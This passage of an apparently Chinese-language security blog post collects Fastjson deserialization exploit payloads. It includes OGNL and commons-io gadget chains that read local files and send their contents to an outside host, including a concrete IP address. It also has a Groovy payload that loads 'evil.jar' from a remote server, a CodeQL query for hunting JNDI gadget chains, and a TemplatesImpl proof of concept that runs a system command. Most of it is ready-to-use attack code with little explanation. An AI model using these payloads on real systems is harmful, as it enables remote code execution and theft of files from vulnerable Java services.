class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.ASTMethod&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;p&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>           <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.OgnlParser&quot;</span><span class="hljs-punctuation">,</span>           <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>     <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="hljs-punctuation">,</span>     <span class="hljs-attr">&quot;delegate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>       <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Locale&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Locale&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;language&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://120.48.129.28:8080/test?&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;country&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;98&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;boms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;bytes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su23&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$[5].su22.node.p.stream&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su20&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>   <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.Evaluation&quot;</span><span class="hljs-punctuation">,</span>   <span class="hljs-attr">&quot;node&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>       <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.ASTMethod&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;p&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>           <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.OgnlParser&quot;</span><span class="hljs-punctuation">,</span>           <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>     <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="hljs-punctuation">,</span>     <span class="hljs-attr">&quot;delegate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>       <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="hljs-punctuation">,</span><br>              <span class="hljs-attr">&quot;charSequence&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$[4].su19&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;start&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;end&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;boms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;bytes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su21&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$[7].su20.node.p.stream&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p>aspectj 读文件 + Character 报错回显</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Character&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;fileName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/Users/su18/Downloads/1.txt&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>commons-io + ognl + URLReader + aspectj HTTP Log 回显</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;su14&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ognl.OgnlException&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;su15&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ognl.OgnlException&quot;</span><span class="hljs-punctuation">,</span>  <span class="hljs-attr">&quot;_evaluation&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;su16&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>   <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.Evaluation&quot;</span><span class="hljs-punctuation">,</span>   <span class="hljs-attr">&quot;node&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>       <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.ASTMethod&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;p&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>           <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ognl.OgnlParser&quot;</span><span class="hljs-punctuation">,</span>           <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>     <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="hljs-punctuation">,</span>     <span class="hljs-attr">&quot;delegate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>       <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Locale&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Locale&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;language&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://x.x.x.x:8080/test?&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;country&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.String&quot;</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;fileName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/Users/su18/Downloads/1.txt&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span>       <span class="hljs-attr">&quot;bufferSize&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1024</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;boms&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;charsetName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;bytes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;su17&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.su16.node.p.stream&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>groovy 远程类加载<br>加白名单</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;unit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>远程类加载</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;classpathList&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;http://.x.x.x:8080/evil.jar&quot;</span><span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;gcl&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;destDir&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/tmp&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="利用链挖掘"><a href="#利用链挖掘" class="headerlink" title="利用链挖掘"></a>利用链挖掘</h2><p><a href="https://xz.aliyun.com/t/7482">https://xz.aliyun.com/t/7482</a><br><a href="https://xz.aliyun.com/t/7789#toc-4">https://xz.aliyun.com/t/7789#toc-4</a><br>主要用codeql进行挖掘</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">/**</span><br><span class="hljs-comment">@kind path-problem</span><br><span class="hljs-comment">*/</span><br><br>import java<br>import semmle.code.java.dataflow.FlowSources<br>import semmle.code.java.dataflow.TaintTracking2<br>import DataFlow2<span class="hljs-punctuation">:</span><span class="hljs-punctuation">:</span>PathGraph<br><br>class JNDIMethod extends Method<span class="hljs-punctuation">&#123;</span><br>  JNDIMethod()<span class="hljs-punctuation">&#123;</span><br>  this.getDeclaringType().getAnAncestor().hasQualifiedName(<span class="hljs-string">&quot;javax.naming&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;Context&quot;</span>) and<br>  this.hasName(<span class="hljs-string">&quot;lookup&quot;</span>)<br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br>class MyTaintTrackingConfiguration extends TaintTracking2<span class="hljs-punctuation">:</span><span class="hljs-punctuation">:</span>Configuration <span class="hljs-punctuation">&#123;</span><br>  MyTaintTrackingConfiguration() <span class="hljs-punctuation">&#123;</span> this = <span class="hljs-string">&quot;MyTaintTrackingConfiguration&quot;</span> <span class="hljs-punctuation">&#125;</span><br><br>override predicate isSource(DataFlow<span class="hljs-punctuation">:</span><span class="hljs-punctuation">:</span>Node source) <span class="hljs-punctuation">&#123;</span><br>  exists(FieldAccess fac|<br>  source.asExpr() = fac<br>  )<br><span class="hljs-punctuation">&#125;</span><br><br>override predicate isSink(DataFlow<span class="hljs-punctuation">:</span><span class="hljs-punctuation">:</span>Node sink) <span class="hljs-punctuation">&#123;</span><br>  exists(MethodAccess call |<br>  call.getMethod() instanceof JNDIMethod and sink.asExpr() = call.getArgument(<span class="hljs-number">0</span>)<br>  )<br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br><br>from  MyTaintTrackingConfiguration config<span class="hljs-punctuation">,</span> DataFlow2<span class="hljs-punctuation">:</span><span class="hljs-punctuation">:</span>PathNode source<span class="hljs-punctuation">,</span> DataFlow2<span class="hljs-punctuation">:</span><span class="hljs-punctuation">:</span>PathNode sink<br>where config.hasFlowPath(source<span class="hljs-punctuation">,</span> sink)<br>select source.getNode()<span class="hljs-punctuation">,</span> source<span class="hljs-punctuation">,</span> sink<span class="hljs-punctuation">,</span> sink.getNode()<br></code></pre></td></tr></table></figure><h2 id="FastJson与原生反序列化"><a href="#FastJson与原生反序列化" class="headerlink" title="FastJson与原生反序列化"></a>FastJson与原生反序列化</h2><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson与原生反序列化/</a><br>利用fastjson调用get、set的特性，构造出新的反序列化利用链。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs json">import com.alibaba.fastjson.JSONArray;<br>import javax.management.BadAttributeValueExpException;<br>import java.io.ByteArrayInputStream;<br>import java.io.ByteArrayOutputStream;<br>import java.io.ObjectInputStream;<br>import java.io.ObjectOutputStream;<br>import java.lang.reflect.Field;<br>import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br>import javassist.ClassPool;<br>import javassist.CtClass;<br>import javassist.CtConstructor;<br>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br>public class Test <span class="hljs-punctuation">&#123;</span><br>  public static void setValue(Object obj<span class="hljs-punctuation">,</span> String name<span class="hljs-punctuation">,</span> Object value) throws Exception<span class="hljs-punctuation">&#123;</span><br>  Field field = obj.getClass().getDeclaredField(name);<br>  field.setAccessible(<span class="hljs-literal"><span class="hljs-keyword">true</span></span>);<br>  field.set(obj<span class="hljs-punctuation">,</span> value);<br><span class="hljs-punctuation">&#125;</span><br><br>public static void main(String<span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span> args) throws Exception<span class="hljs-punctuation">&#123;</span><br>  ClassPool pool = ClassPool.getDefault();<br>  CtClass clazz = pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>  CtClass superClass = pool.get(AbstractTranslet.class.getName());<br>  clazz.setSuperclass(superClass);<br>  CtConstructor constructor = new CtConstructor(new CtClass<span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> clazz);<br>constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);<br>clazz.addConstructor(constructor);<br>byte<span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span> bytes = new byte<span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#123;</span>clazz.toBytecode()<span class="hljs-punctuation">&#125;</span>;<br>TemplatesImpl templates = TemplatesImpl.class.newInstance();<br>setValue(templates<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;_bytecodes&quot;</span><span class="hljs-punctuation">,</span> bytes);<br>setValue(templates<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;_name&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;y4tacker&quot;</span>);<br>setValue(templates<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;_tfactory&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span>);<br><br><br>JSONArray jsonArray = new JSONArray();<br>jsonArray.add(templates);<br><br>BadAttributeValueExpException val = new BadAttributeValueExpException(<span class="hljs-literal"><span class="hljs-keyword">null</span></span>);<br>Field valfield = val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>valfield.setAccessible(<span class="hljs-literal"><span class="hljs-keyword">true</span></span>);<br>valfield.set(val<span class="hljs-punctuation">,</span> 